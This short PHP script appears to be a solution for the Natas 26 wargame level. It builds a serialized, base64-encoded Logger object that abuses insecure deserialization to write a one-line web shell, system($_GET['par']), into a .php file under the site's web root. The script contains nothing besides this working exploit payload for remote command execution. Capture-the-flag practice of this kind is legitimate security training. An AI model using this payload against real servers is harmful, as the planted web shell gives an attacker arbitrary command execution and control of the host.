<?php

class Logger{
    private $logFile = "/var/www/natas/natas26/img/qwert.php";
    private $initMsg = "tebelash\n";
    private $exitMsg = '<?php system($_GET["par"]); ?>\n';     
    // function __construct(){
    //     // initialise variables
    //     $this->initMsg="#--session started--#\n";
    //     $this->exitMsg="#--session end--#\n";
    //     $this->logFile = "/tmp/natas26_" . $file . ".log";
    // }          
}



$obj = new Logger;

// echo htmlspecialchars(serialize($obj));
print base64_encode(serialize($obj));

?> 